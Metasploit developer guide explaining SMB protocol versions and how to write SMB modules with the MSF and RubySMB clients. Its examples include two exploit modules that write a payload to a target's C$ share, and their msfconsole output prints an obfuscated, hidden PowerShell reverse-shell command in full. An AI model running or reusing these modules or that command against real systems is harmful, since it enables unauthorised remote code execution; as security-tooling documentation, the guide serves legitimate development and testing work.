This is a simple guideline to write SMB-based modules, focusing on the new RubySMB implementation that includes SMB3 support.

## SMB Protocol Overview

SMB (Server Message Block) is a network communication protocol that provides file sharing, network browsing, printing services, and interprocess communication over a network. It relies on lower level protocol transports:
* NetBIOS
  - over TCP/IP (NBT) on 137/UDP, 138/UDP, 137/TCP and 139/TCP
  - over NetBEUI
* Directly over TCP on 445/TCP (by far the most commonly used)

[CIFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/d416ff7c-c536-406e-a951-4f04b2fd1d2b) is a particular implementation of SMB created by Microsoft based on the original IBM specifications. It has been replaced by [SMB v1.0](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688), which is a Microsoft Extensions to MS-CIFS.

[SMB2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962) is a complete rewrite of the protocol which primarily aims to reduce the amount of messages exchanged between the client and the server. SMB v2.0 has been introduced in Windows Vista/Server 2008. It also brings some new features such as:
* Pipelining
* Symbolic links
* Large file transfers improvement
* Better signing
* New opportunistic locking mechanism

SMB v2.1 was added to Windows 7/Server 2008 R2 with a few improvements:
* Minor performance enhancements
* New opportunistic locking mechanism

[SMB3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962) adds some interesting features and has been introduced in Windows 8/Server 2012. Here are some new capabilities added by the SMB v3.0 dialect:
* SMB Direct (SMB over remote direct memory access - RDMA)
* SMB Multichannel (multiple connections per SMB session)
* SMB Transparent Failover (useful for clustered file server)
* Per-share encryption (AES-128 CCM) and AES-based signing

SMB v3.0.2 (from Windows 8.1/Server 2012 R2) only adds some small improvements. Finally, SMB v3.1.1 (from Windows 10/Server 2016) introduces the following features:
* Negotiation of encryption and integrity algorithms
* AES-128 GCM encryption
* Pre-authentication integrity check (SHA-512)
* Compression

## Common SMB Packet Exchange Scenarios

1. **NetBIOS session establishment**  
This step is only required if NetBIOS over TCP (NBT) transport is used. This is not very common anymore, since SMB over TCP (from windows 2000) removed the NetBIOS transport layer. In case a NetBIOS session needs to be established, this must be the first packet exchange.

2. **Negotiation**  
This is where the SMB protocol version and dialect are going to be negotiated between the client and the server. From SMB v3.1.1, encryption/compression capabilities are also negotiated at the same time.

3. **Authentication**  
Depending on the authentication scheme, this step requires one or two packet exchanges. NTLM challenge-response, the only authentication protocol supported by RubySMB at time of writing, consists of sending first a Session Setup packet containing the client capabilities. The server responds with a challenge. Then, another Session Setup request is sent with the challenge response. If it is accepted, the server returns a Session ID that will be used in subsequent requests. This defines the beginning of an SMB Session.

<figure>
  <img src="https://user-images.githubusercontent.com/56716719/89442188-ab533780-d74e-11ea-8223-8f43b71e08f5.png" alt="Negotiation & Authentication">
  <figcaption style="text-align:center"><i>Fig.1 - Negotiation & authentication packet exchanges</i></figcaption>
</figure>

4. **Connect to a share**  
Once the SMB session is established, the SMB client must connect to a remote share.This is done by sending a TreeConnect request and getting a Tree ID. This identifier will be used by subsequent file operations on this share.

5. **File operation**  
From there, the client can execute any file operation on the remote share, such as open, read, write, delete, rename, etc. When the client is done with a file, it can simply close the handle. The Tree ID remains valid and can be reused.

<figure>
  <img src="https://user-images.githubusercontent.com/56716719/89446561-f96b3980-d754-11ea-868c-7714366168f5.png" alt="Connect to share and read file">
  <figcaption style="text-align:center"><i>Fig.2 - Connect to share & read file packet exchanges</i></figcaption>
</figure>

6. **Close tree and session**  
The client can decide to release the connection to the share at any time by sending a TreeDisconnect request. Note that the SMB session will remain active until the client sends a Logoff packet, which defines the end of the SMB Session.

## Module Writing

### Using the default MSF client

The following mixin will bring everything you need, including the main MSF SMB Client.
```ruby
include Msf::Exploit::Remote::SMB::Client::Authenticated
```

Following the same workflow described above:
1. **Initialization**

The first step is to initialize the client by invoking `connect`. The version(s) that will be negotiated can also be set up by passing an array to the keyword arguments versions. For example, to negotiate any dialect of SMB version 2 and 3, use this:
```ruby
connect(versions: [2, 3])
```
The default is to negotiate versions 1, 2 and 3. Note that the client will just let the SMB server know which versions and dialects it supports. The server will always choose the latest version it supports. This means, Windows 7 will always choose SMB v2.1 (SMB3 has been added to Windows 8 only), even if versions 1, 2 and 3 are advertised by the client. If SMB2 is disabled on this host for whatever reason, the SMB server will fall back to SMB1. By choosing which versions the client must negotiate, you can force the server to use a specific protocol version, assuming it is supported and enabled.  
From Metasploit 6, the MSF client uses RubySMB under the hood by default for any SMB protocol version. For compatibility with older modules, it is still possible to force the client to use the original Rex SMB implementation. Note that this is **not recommended** and RubySMB should be the default for new modules. This can be done by explicitly negotiate SMB1 only (Rex only supports this version):
```ruby
connect(versions: [1])
```

2. **NetBIOS session, negotiation and authentication**

The actual negotiation and authentication are handled by `smb_login`. This retrieves the NetBIOS name, user name, password and domain from the `SMBName`, `SMBUser`, `SMBPass` and `SMBDomain` options set by the operator, respectively. Other options can be set and are defined in [MSF SMB client](https://github.com/rapid7/metasploit-framework/blob/a7d255bbe5537822c614ede71933fdc6597dd369/lib/msf/core/exploit/remote/smb/client.rb). Under the hood, `smb_login` establishes the NetBIOS session (if needed), negotiates the protocol version/dialect and sets the SMB Session up using NTLM challenge-response authentication protocol.

If, for whatever reason, the authentication options cannot be retrieved from the user options, it is still possible to provide them manually by calling `simple.login()` directly (see [SimpleClient#login](https://github.com/rapid7/metasploit-framework/blob/a7d255bbe5537822c614ede71933fdc6597dd369/lib/rex/proto/smb/simple_client.rb#L55))
```ruby
simple.login(name, user, pass)
```

Note that `simple` is the `Rex::Proto::SMB::SimpleClient` object and is accessible anywhere in the module. This is the main interface to interact with RubySMB (more on that later).

3. **Connect to a share**

This is done by invoking `simple.connect`:
```ruby
simple.connect("\\\\<host>\\<share>")
```

4. **File operations**

* read a file
```ruby
file_path = 'file/path/relative/to/the/share/root'
file = smb_open(file_path, 'o')
print_status("File content: #{file.read}")
file.close
```
See [SimpleClient#open](https://github.com/rapid7/metasploit-framework/blob/a7d255bbe5537822c614ede71933fdc6597dd369/lib/rex/proto/smb/simple_client.rb#L189) and [RubySMB::Dispositions](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/dispositions.rb) for details about the `smb_open` mode argument.

* write to a file
```ruby
file = smb_open(file_path, 'co', write: true)
file << "my file data"
file.close
```

* delete a file
```ruby
simple.delete(file_path)
```

5. **Close the connection to the remote share**

```ruby
simple.disconnect("\\\\<host>\\<share>")
```

Since Metasploit 6, two new options were introduced to control version negotiation and encryption. These options are only available when using the default MSF SMB client and are automatically pulled in with `Msf::Exploit::Remote::SMB::Client` or `Msf::Exploit::Remote::SMB::Client::Authenticated` mixins:
* `SMB::ProtocolVersion`: one or a list of comma-separated SMB protocol versions to negotiate (e.g. "1" or "1,2" or "2,3,1").
* `SMB::AlwaysEncrypt`: enforces encryption even if the server does not require it (SMB3.x only). When it is set to false, the SMB client will still encrypt the communication if the server requires it.

### Using RubySMB client directly

This mixin is not required but can be useful to expose the SMB related options to the operator:

```ruby
include Msf::Exploit::Remote::SMB::Client::Authenticated
```

An alternative is to register the options we need in `initialize`:

```ruby
register_options([
  OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
  OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
  OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
])
```

Following the same workflow described above:

1. **Initialization**

* setup the dispatcher
```ruby
dispatcher = RubySMB::Dispatcher::Socket.new(sock)
```
* initialize the client
SMB versions 1, 2 and 3 will be negotiated by default. Use `smb1`, `smb2` and `smb3` keyword arguments to disable a version (`false` value). See [RubySMB::Client#initialize](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/client.rb#L281) for more initialization options
```ruby
client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain'])
```

2. **Negotiation**

```ruby
client.negotiate
```

3. **Authentication**

```ruby
client.authenticate
```

4. **Connect to a share**

```ruby
tree = client.tree_connect(\\\\<host>\\<share>)
```

5. **File operations**

```ruby
file_path = 'file/path/relative/to/the/share/root'
```

* read a file (see [RubySMB::SMB1::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb1/tree.rb#L83) and [RubySMB::SMB2::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb2/tree.rb#L67) for details)
```ruby
file = tree.open_file(filename: file_path)
data = file.read
file.close
```

* write to a file
```ruby
file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF)
file.write(data: 'my data')
file.close
```

* delete a file
```ruby
file = tree.open_file(filename: file_path, delete: true)
file.delete
file.close
```

6. **Close the connection to the remote share**

```ruby
tree.disconnect!
```

7. **Close the SMB session**

```ruby
client.disconnect!
```

## Examples

### Using the default MSF client

`modules/exploits/windows/smb/msf_smb_client_test.rb`

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'MSF SMB Client Test',
        'Description'    => %q(
          This module simply write, read and delete a file on the remote host
          using default MSF SMB client.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Christophe De La Fuente' ],
        'Platform'       => 'windows',
        'Arch'           => ARCH_CMD,
        'Targets'        => [[ 'Windows', {} ]],
        'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
      )
    )
  end

  def exploit
    connect
    smb_login

    share = "\\\\#{rhost}\\C$"
    simple.connect(share)

    file_path = 'Windows\\Temp\\payload.bat'
    print_status("Create and write to #{file_path} on #{share} remote share")
    file = smb_open(file_path, 'co', write: true)
    file << payload.encode
    file.close

    print_status("Read #{file_path} on #{share} remote share")
    file = smb_open(file_path, 'o')
    print_status("File content: #{file.read}")
    file.close

    print_status("Delete #{file_path} on #{share} remote share")
    simple.delete(file_path)
  ensure
    simple.disconnect(share) if simple
  end
end
```

msfconsole output:

```msf
msf6 exploit(windows/smb/msf_smb_client_test) > options

Module options (exploit/windows/smb/msf_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The SMB service port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/msf_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAFzTKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```

### Using RubySMB client directly

`modules/exploits/windows/smb/ruby_smb_client_test.rb`

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'RubySMB Client Test',
        'Description'    => %q(
          This module simply write, read and delete a file on the remote host
          using default RubySMB client.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Christophe De La Fuente' ],
        'Platform'       => 'windows',
        'Arch'           => ARCH_CMD,
        'Targets'        => [[ 'Windows', {} ]],
        'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
      )
    )

    register_options([
      OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
      OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
      OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
    ])
  end

  def exploit
    sock = connect
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain'], always_encrypt: false)

    client.negotiate
    client.authenticate

    share = "\\\\#{rhost}\\C$"
    tree = client.tree_connect(share)

    file_path = 'Windows\\Temp\\payload.bat'
    print_status("Create and write to #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF)
    file.write(data: payload.encode)
    file.close

    print_status("Read #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path)
    print_status("File content: #{file.read}")
    file.close

    print_status("Delete #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path, delete: true)
    file.delete
    file.close

  ensure
    tree.disconnect! if tree
    client.disconnect! if client
  end
end
```

msfconsole output:

```msf
msf6 exploit(windows/smb/ruby_smb_client_test) > options

Module options (exploit/windows/smb/ruby_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/ruby_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAA3UKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```
